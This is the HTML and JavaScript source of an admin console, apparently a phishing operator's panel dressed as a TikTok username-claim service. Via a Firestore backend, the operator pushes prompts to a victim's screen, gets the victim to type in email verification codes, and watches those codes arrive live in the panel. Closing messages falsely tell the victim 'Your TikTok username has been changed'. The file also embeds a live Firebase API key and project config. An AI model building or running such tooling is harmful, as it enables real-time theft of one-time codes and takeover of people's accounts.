<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Braindeer — Claim Requests (Admin)</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background:#fff; color:#161823;
  }
  .topbar {
    height:56px; border-bottom:1px solid #f1f1f2;
    display:flex; align-items:center; padding:0 18px;
    position:sticky; top:0; background:#fff; z-index:10;
  }
  .brand { display:flex; align-items:center; gap:9px; }
  .mark {
    width:30px; height:30px; border-radius:8px; background:#161823; color:#25f4ee;
    display:grid; place-items:center; font-weight:900; font-size:16px;
    font-family:ui-monospace,Menlo,monospace;
  }
  .brand .name { font-weight:800; font-size:18px; letter-spacing:-0.3px; }
  .brand .name b { color:#fe2c55; }
  .topbar .sub { margin-left:12px; font-size:12px; color:#16182380; }
  .spacer { flex:1; }
  .stats { display:flex; gap:8px; }
  .stat {
    background:#f8f8f8; border:1px solid #f1f1f2; border-radius:6px; padding:5px 11px; text-align:center;
  }
  .stat .n { font-size:16px; font-weight:800; }
  .stat .l { font-size:9px; color:#16182380; text-transform:uppercase; letter-spacing:.4px; }
  .stat.q .n { color:#fe2c55; }
  .stat.w .n { color:#161823; }
  .stat.c .n { color:#25f4ee; }
  .stat.r .n { color:#16182380; }
  .live { font-size:12px; color:#fe2c55; font-weight:700; display:flex; align-items:center; gap:6px; margin-left:10px; }
  .live .dot { width:7px; height:7px; border-radius:50%; background:#fe2c55; animation:pl 1.6s infinite; }
  @keyframes pl { 0%,100%{opacity:1;} 50%{opacity:.25;} }

  .layout { display:grid; grid-template-columns:360px 1fr; height:calc(100vh - 56px); }
  @media (max-width:900px){ .layout{ grid-template-columns:1fr; height:auto; } }

  .side { border-right:1px solid #f1f1f2; overflow-y:auto; padding:14px; }
  .side h2 { font-size:11px; text-transform:uppercase; letter-spacing:.6px; color:#16182380; margin-bottom:10px; }
  .filters { display:flex; gap:6px; margin-bottom:12px; flex-wrap:wrap; }
  .chip {
    font-size:11px; padding:5px 10px; border-radius:999px; cursor:pointer;
    background:#fff; border:1px solid #e3e3e4; color:#16182380;
  }
  .chip.on { background:#fe2c55; color:#fff; border-color:#fe2c55; }
  .chip .c { opacity:.7; margin-left:3px; }

  .card {
    background:#fff; border:1px solid #f1f1f2; border-radius:8px;
    padding:11px 13px; margin-bottom:8px; cursor:pointer; position:relative;
  }
  .card:hover { border-color:#fe2c55; }
  .card.sel { border-color:#fe2c55; box-shadow:0 0 0 2px #fe2c5522; }
  .card .top { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
  .card .id { font-size:10px; color:#16182380; font-weight:700; }
  .card .claim {
    font-size:14px; font-weight:700; color:#fe2c55;
  }
  .card .from { font-size:11px; color:#16182380; margin-top:1px; }
  .card .em { font-size:12px; color:#16182380; margin-top:3px; }
  .card .nm { font-size:11px; color:#161823cc; margin-top:2px; }
  .card .tm { font-size:10px; color:#c8c8cc; margin-top:5px; }
  .pill { font-size:9px; font-weight:700; padding:2px 8px; border-radius:999px; text-transform:uppercase; letter-spacing:.4px; }
  .p-queued { background:#fff1f3; color:#fe2c55; }
  .p-prompted { background:#f1f1f2; color:#161823; }
  .p-code_submitted { background:#e6fffe; color:#0bb8a8; }
  .p-resolved { background:#f8f8f8; color:#16182380; }
  .ndot { position:absolute; top:9px; right:11px; width:7px; height:7px; border-radius:50%; background:#fe2c55; }
  .ndot.cod { background:#25f4ee; }

  .empty { text-align:center; color:#16182380; padding:30px 8px; font-size:13px; }

  .main { overflow-y:auto; padding:22px 26px; }
  .de { display:grid; place-items:center; height:100%; color:#16182380; text-align:center; font-size:14px; }
  .de .b { font-size:38px; margin-bottom:10px; opacity:.4; }

  .dh { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:16px; gap:12px; flex-wrap:wrap; }
  .dh h1 { font-size:21px; font-weight:700; }
  .dh h1 .to { color:#fe2c55; }
  .dh .s { font-size:13px; color:#16182380; margin-top:2px; }

  .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:8px; margin-bottom:18px; }
  .ic { background:#f8f8f8; border:1px solid #f1f1f2; border-radius:8px; padding:10px 12px; }
  .ic .k { font-size:9px; text-transform:uppercase; letter-spacing:.4px; color:#16182380; margin-bottom:3px; }
  .ic .v { font-size:14px; font-weight:600; word-break:break-all; }
  .ic .v.m { font-family:ui-monospace,Menlo,monospace; letter-spacing:1px; }
  .ic.claim .v { color:#fe2c55; }

  .st { font-size:11px; text-transform:uppercase; letter-spacing:.6px; color:#16182380; margin:20px 0 8px; }

  .acts { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:4px; }
  .ab {
    padding:10px 14px; border-radius:6px; border:1px solid #e3e3e4;
    background:#fff; color:#161823; font-size:13px; font-weight:600; cursor:pointer; font-family:inherit;
  }
  .ab:hover { border-color:#fe2c55; }
  .ab:disabled { opacity:.4; cursor:not-allowed; }
  .ab.pri { background:#fe2c55; color:#fff; border-color:#fe2c55; }
  .ab.warn { color:#ff7a45; border-color:#ffd9c2; background:#fff7f3; }
  .ab.fin { background:#161823; color:#fff; border-color:#161823; }
  .ab.ok { color:#0bb8a8; border-color:#bff7f2; background:#f0fffe; }
  .ab .c { background:rgba(255,255,255,.2); padding:1px 6px; border-radius:999px; font-size:10px; margin-left:5px; }
  .ab.pri .c, .ab.fin .c { background:rgba(255,255,255,.25); }

  .pe { background:#f8f8f8; border:1px solid #f1f1f2; border-radius:8px; padding:12px; margin-bottom:12px; }
  .pe label { font-size:12px; color:#16182380; display:block; margin-bottom:5px; }
  .pe textarea {
    width:100%; min-height:64px; background:#fff; border:1px solid #e3e3e4;
    border-radius:6px; padding:9px; font-size:13px; resize:vertical; outline:none; font-family:inherit; color:#161823;
  }
  .pe textarea:focus { border-color:#fe2c55; }
  .hint { font-size:11px; color:#16182380; margin-top:6px; line-height:1.5; }

  .cdbox { background:#f0fffe; border:1px solid #bff7f2; border-radius:8px; padding:14px 16px; margin-bottom:14px; }
  .cdbox .l { font-size:10px; text-transform:uppercase; letter-spacing:.6px; color:#0bb8a8; font-weight:700; margin-bottom:5px; }
  .cdbox .cd { font-family:ui-monospace,Menlo,monospace; font-size:24px; font-weight:800; letter-spacing:5px; }
  .cdbox .mt { font-size:11px; color:#16182380; margin-top:5px; }

  .log { background:#f8f8f8; border:1px solid #f1f1f2; border-radius:8px; padding:8px 12px; max-height:200px; overflow-y:auto; }
  .lr { display:flex; gap:9px; padding:6px 0; border-bottom:1px solid #f1f1f2; font-size:12px; }
  .lr:last-child { border-bottom:none; }
  .lr .t { color:#16182380; min-width:55px; font-size:11px; }
  .lr .e b { color:#fe2c55; }

  .rr { display:flex; gap:8px; margin-top:14px; align-items:center; }
  .rr input {
    flex:1; padding:10px 12px; background:#fff; border:1px solid #e3e3e4;
    border-radius:6px; font-size:13px; outline:none; font-family:inherit; color:#161823;
  }
  .rr input:focus { border-color:#25f4ee; }

  ::-webkit-scrollbar { width:7px; height:7px; }
  ::-webkit-scrollbar-thumb { background:#e3e3e4; border-radius:4px; }
  ::-webkit-scrollbar-thumb:hover { background:#c8c8cc; }
</style>
</head>
<body>

<div class="topbar">
  <div class="brand">
    <div class="mark">B</div>
    <div class="name">Brain<b>deer</b></div>
  </div>
  <div class="sub">Claim Requests — Admin</div>
  <div class="spacer"></div>
  <div class="stats">
    <div class="stat q"><div class="n" id="cQ">0</div><div class="l">Queued</div></div>
    <div class="stat w"><div class="n" id="cW">0</div><div class="l">Waiting</div></div>
    <div class="stat c"><div class="n" id="cC">0</div><div class="l">Codes</div></div>
    <div class="stat r"><div class="n" id="cR">0</div><div class="l">Done</div></div>
  </div>
  <div class="live"><span class="dot"></span>LIVE</div>
</div>

<div class="layout">
  <div class="side">
    <h2>Username Claims</h2>
    <div class="filters">
      <div class="chip on" data-f="active">Active <span class="c" id="fA">0</span></div>
      <div class="chip" data-f="queued">Queued</div>
      <div class="chip" data-f="prompted">Waiting</div>
      <div class="chip" data-f="code_submitted">Codes</div>
      <div class="chip" data-f="resolved">Done</div>
      <div class="chip" data-f="all">All</div>
    </div>
    <div id="list"></div>
  </div>

  <div class="main" id="main">
    <div class="de" id="de">
      <div>
        <div class="b">📋</div>
        <p>Pick a claim on the left to view it<br>and control the customer's screen.</p>
      </div>
    </div>
    <div id="det" style="display:none;"></div>
  </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import {
  getFirestore, collection, doc, onSnapshot, updateDoc, serverTimestamp, query, orderBy
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey:"AIzaSyCNJHdwKDJsGJVmJgT5krOi5TKy4tlNg_U",
  authDomain:"helpauth-3188a.firebaseapp.com",
  projectId:"helpauth-3188a",
  storageBucket:"helpauth-3188a.firebasestorage.app",
  messagingSenderId:"770056927485",
  appId:"1:770056927485:web:fff41d61ef6fa3f86a6694",
  measurementId:"G-Z79FBNPX35"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let tickets=[], selId=null, filter="active";
const seen=new Set(), codeSeen=new Set();
const $ = id => document.getElementById(id);

onSnapshot(query(collection(db,"tickets"), orderBy("createdAt","desc")), snap=>{
  tickets=[];
  snap.forEach(d=>{
    const t={id:d.id, ...d.data()};
    if(!seen.has(t.id)) t._new=true;
    if(t.status==="code_submitted" && !codeSeen.has(t.id)) t._codeNew=true;
    tickets.push(t);
  });
  renderList(); renderStats();
  if(selId) renderDetail();
});

function renderStats(){
  const c={queued:0,prompted:0,code_submitted:0,resolved:0};
  tickets.forEach(t=>{ if(c[t.status]!==undefined) c[t.status]++; });
  $("cQ").textContent=c.queued; $("cW").textContent=c.prompted;
  $("cC").textContent=c.code_submitted; $("cR").textContent=c.resolved;
  $("fA").textContent=c.queued+c.prompted+c.code_submitted;
}

function match(t){
  if(filter==="all") return true;
  if(filter==="active") return t.status!=="resolved";
  return t.status===filter;
}

function renderList(){
  const list=$("list");
  const f=tickets.filter(match);
  if(!f.length){ list.innerHTML='<div class="empty">Nothing here.</div>'; return; }
  list.innerHTML=f.map(t=>{
    const s={queued:"Queued",prompted:"Waiting for code",code_submitted:"Code submitted",resolved:"Done"}[t.status]||t.status;
    const nd=t._new?'<span class="ndot"></span>':(t._codeNew?'<span class="ndot cod"></span>':"");
    const cb=t._codeNew?' <span class="pill p-code_submitted" style="margin-left:5px;">NEW</span>':"";
    return `<div class="card ${t.id===selId?"sel":""}" data-id="${t.id}">
      ${nd}
      <div class="top"><span class="id">${t.ticketId||t.id}</span><span class="pill p-${t.status}">${s}</span></div>
      <div class="claim">@${esc(t.name||"—")}${cb}</div>
      <div class="from">from @${esc(t.username||"—")}</div>
      <div class="em">${esc(t.email||"—")}</div>
      <div class="tm">${ft(t.updatedAt||t.createdAt)}</div>
    </div>`;
  }).join("");
  list.querySelectorAll(".card").forEach(el=> el.onclick=()=>select(el.dataset.id));
}

function select(id){
  selId=id; seen.add(id); codeSeen.add(id);
  renderList(); renderDetail();
}

function renderDetail(){
  const t=tickets.find(x=>x.id===selId);
  if(!t){ $("de").style.display="grid"; $("det").style.display="none"; return; }
  $("de").style.display="none"; $("det").style.display="block";

  const att=t.attempt||0, resolved=t.status==="resolved", hasCode=!!t.clientCode;
  const sLabel={queued:"Queued — needs your action",prompted:"Prompted — waiting on customer",code_submitted:"Customer sent a code!",resolved:"Done"}[t.status]||t.status;

  $("det").innerHTML=`
    <div class="dh">
      <div>
        <h1>Claiming <span class="to">@${esc(t.name||"—")}</span></h1>
        <div class="s">from @${esc(t.username||"")} • ${t.ticketId||t.id} • <span class="pill p-${t.status}">${sLabel}</span></div>
      </div>
    </div>

    <div class="grid">
      <div class="ic"><div class="k">Current username</div><div class="v">@${esc(t.username||"—")}</div></div>
      <div class="ic claim"><div class="k">Claiming</div><div class="v">@${esc(t.name||"—")}</div></div>
      <div class="ic"><div class="k">Email</div><div class="v">${esc(t.email||"—")}</div></div>
      <div class="ic"><div class="k">Attempt</div><div class="v">${att} / 3</div></div>
      <div class="ic"><div class="k">Created</div><div class="v" style="font-size:12px;">${ft(t.createdAt)}</div></div>
      <div class="ic"><div class="k">Updated</div><div class="v" style="font-size:12px;">${ft(t.updatedAt)}</div></div>
    </div>

    ${hasCode?`<div class="st">Customer's code</div>
      <div class="cdbox">
        <div class="l">Code from customer</div>
        <div class="cd">${esc(t.clientCode)}</div>
        <div class="mt">Sent ${ft(t.clientCodeAt)}${t._codeNew?' • <b style="color:#0bb8a8;">NEW</b>':''}</div>
      </div>`:""}

    ${!resolved?`
      <div class="st">Control — prompts the customer's screen</div>
      <div class="pe">
        <label>Message shown to customer (optional)</label>
        <textarea id="cp" placeholder="e.g. We sent a fresh code to your email. Enter it below to confirm your new username.">${esc(t.adminPrompt||defPrompt())}</textarea>
        <div class="hint">Pressing a button flips the customer's screen to a code-entry box showing this message. What they type comes back here.</div>
      </div>
      <div class="acts">
        <button class="ab pri" id="bReq" ${att>=3?"disabled":""}>Request code from email<span class="c">${att}/3</span></button>
        <button class="ab warn" id="bTry" ${!hasCode?"disabled":""}>Try again</button>
        <button class="ab fin" id="bFin" ${att>=3?"disabled":""}>Request code again (FINAL)</button>
      </div>
      <div class="hint">"Request code" = attempt ${att+1} of 3. After the 3rd, code requests lock.</div>

      <div class="st">Resolve</div>
      <div class="rr">
        <input id="rMsg" type="text" placeholder="Message for customer (e.g. 'Your username is now @new_name!')">
        <button class="ab ok" id="bRes">Mark done</button>
      </div>
    `:`
      <div class="st">Done</div>
      <div class="ic"><div class="k">Resolution</div><div class="v">${esc(t.resolutionMessage||"Resolved")}</div></div>
      <div style="margin-top:12px;"><button class="ab" id="bReopen">Reopen</button></div>
    `}

    <div class="st">Activity</div>
    <div class="log" id="log">${buildLog(t)}</div>
  `;

  if(!resolved){
    $("bReq").onclick=()=>act(t,"request_code");
    $("bTry").onclick=()=>act(t,"try_again");
    $("bFin").onclick=()=>act(t,"request_code_final");
    $("bRes").onclick=()=>resolve(t);
  } else {
    $("bReopen").onclick=()=>reopen(t);
  }
}

function defPrompt(){ return "Enter the verification code we sent to your email to confirm your new username."; }

async function act(t,action){
  const prompt=($("cp")?.value||"").trim()||defPrompt();
  let att=t.attempt||0;
  if(action==="request_code") att+=1;
  else if(action==="request_code_final") att=3;
  ["bReq","bTry","bFin"].forEach(b=>{ const e=$(b); if(e) e.disabled=true; });
  try {
    await updateDoc(doc(db,"tickets",t.id),{
      adminAction:action, adminPrompt:prompt, attempt:att,
      status:"prompted", clientCode:null, clientCodeAt:null,
      updatedAt:serverTimestamp(),
      [`log_${Date.now()}`]:{action,attempt:att,at:new Date().toISOString()}
    });
  } catch(e){ alert("Failed: "+e.message); }
  renderDetail();
}

async function resolve(t){
  const msg=($("rMsg")?.value||"").trim()||("Your TikTok username has been changed to @" + (t.name||"") + "!");
  try {
    await updateDoc(doc(db,"tickets",t.id),{
      status:"resolved", resolutionMessage:msg, resolutionTitle:"Username changed!",
      adminAction:null, updatedAt:serverTimestamp(),
      [`log_${Date.now()}`]:{action:"resolved",at:new Date().toISOString()}
    });
  } catch(e){ alert("Failed: "+e.message); }
}

async function reopen(t){
  try {
    await updateDoc(doc(db,"tickets",t.id),{
      status:"queued", resolutionMessage:null, updatedAt:serverTimestamp()
    });
  } catch(e){ alert("Failed: "+e.message); }
}

function buildLog(t){
  const rows=[];
  if(t.createdAt) rows.push({t:ft(t.createdAt),e:`Claim created — @${esc(t.username||"")} → @${esc(t.name||"")}`});
  Object.keys(t).filter(k=>k.startsWith("log_")).sort().forEach(k=>{
    const l=t[k];
    const lbl={request_code:"Requested code from email",try_again:"Asked to try again",request_code_final:"Requested code (FINAL)",resolved:"Marked done"}[l.action]||l.action;
    rows.push({t:ft(l.at),e:lbl+(l.attempt?` (attempt ${l.attempt})`:"")});
  });
  if(t.clientCode) rows.push({t:ft(t.clientCodeAt),e:`Customer sent code: <b>${esc(t.clientCode)}</b>`});
  if(!rows.length) return '<div class="empty">No activity.</div>';
  return rows.map(r=>`<div class="lr"><span class="t">${r.t}</span><span class="e">${r.e}</span></div>`).join("");
}

function esc(s){ if(s==null) return ""; return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function ft(ts){
  if(!ts) return "—";
  let d = ts.toDate?ts.toDate() : (ts instanceof Date?ts : (typeof ts==="string"?new Date(ts):null));
  if(!d||isNaN(d)) return "—";
  const diff=(new Date()-d)/1000;
  if(diff<60) return "now";
  if(diff<3600) return Math.floor(diff/60)+"m";
  if(diff<86400) return Math.floor(diff/3600)+"h";
  return d.toLocaleDateString();
}

document.querySelectorAll(".chip").forEach(c=>{
  c.onclick=()=>{
    document.querySelectorAll(".chip").forEach(x=>x.classList.remove("on"));
    c.classList.add("on"); filter=c.dataset.f; renderList();
  };
});
</script>
</body>
</html>
